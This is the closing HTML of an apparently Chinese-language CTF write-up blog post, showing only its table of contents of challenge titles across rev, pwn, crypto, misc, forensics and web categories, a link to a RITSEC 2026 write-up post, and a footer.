+</div></article><aside class="post-outline" aria-label="文章目錄"><p class="post-outline__eyebrow">本文導航</p><p class="post-outline__title">按標題快速定位</p><nav class="post-toc" data-post-toc><ol class="post-toc__list"><li class="post-toc__list-item post-toc__list-level-2"><a class="post-toc__list-link" href="#rev"><span class="post-toc__list-text">rev</span></a><ol class="post-toc__list-child"><li class="post-toc__list-item post-toc__list-level-3"><a class="post-toc__list-link" href="#Batcave-Bitflip"><span class="post-toc__list-text">Batcave Bitflip</span></a></li></ol></li><li class="post-toc__list-item post-toc__list-level-2"><a class="post-toc__list-link" href="#pwn"><span class="post-toc__list-text">pwn</span></a><ol class="post-toc__list-child"><li class="post-toc__list-item post-toc__list-level-3"><a class="post-toc__list-link" href="#Brick-City-Office-Space"><span class="post-toc__list-text">Brick City Office Space</span></a></li></ol></li><li class="post-toc__list-item post-toc__list-level-2"><a class="post-toc__list-link" href="#Brick-Workshop"><span class="post-toc__list-text">Brick Workshop</span></a></li><li class="post-toc__list-item post-toc__list-level-2"><a class="post-toc__list-link" href="#crypto"><span class="post-toc__list-text">crypto</span></a><ol class="post-toc__list-child"><li class="post-toc__list-item post-toc__list-level-3"><a class="post-toc__list-link" href="#The-Accursed-Lego-Bin"><span class="post-toc__list-text">The Accursed Lego Bin</span></a></li></ol></li><li class="post-toc__list-item post-toc__list-level-2"><a class="post-toc__list-link" href="#misc"><span class="post-toc__list-text">misc</span></a><ol class="post-toc__list-child"><li class="post-toc__list-item post-toc__list-level-3"><a class="post-toc__list-link" href="#Deep-Down"><span class="post-toc__list-text">Deep Down</span></a></li><li class="post-toc__list-item post-toc__list-level-3"><a class="post-toc__list-link" href="#Take-a-Slice"><span class="post-toc__list-text">Take a Slice</span></a></li></ol></li><li class="post-toc__list-item post-toc__list-level-2"><a class="post-toc__list-link" href="#forensics"><span class="post-toc__list-text">forensics</span></a><ol class="post-toc__list-child"><li class="post-toc__list-item post-toc__list-level-3"><a class="post-toc__list-link" href="#Click-Here-For-Free-Bricks"><span class="post-toc__list-text">Click Here For Free Bricks</span></a></li></ol></li><li class="post-toc__list-item post-toc__list-level-2"><a class="post-toc__list-link" href="#web"><span class="post-toc__list-text">web</span></a><ol class="post-toc__list-child"><li class="post-toc__list-item post-toc__list-level-3"><a class="post-toc__list-link" href="#Brick-by-Brick"><span class="post-toc__list-text">Brick by Brick</span></a></li><li class="post-toc__list-item post-toc__list-level-3"><a class="post-toc__list-link" href="#BrOWSER-BOSS-FIGHT"><span class="post-toc__list-text">BrOWSER BOSS FIGHT</span></a></li></ol></li></ol></nav></aside></div><nav class="post-nav"><a class="post-nav__item post-nav__item--next" href="/2026/04/08/ritsec2026-%E7%B0%A1%E5%96%AEwriteup/"><span class="post-nav__label">下一篇</span><strong>ritsec2026 簡單writeup</strong></a></nav></main><footer class="site-footer"><p class="site-footer__text">=Ʌ=</p></footer></div></body></html>
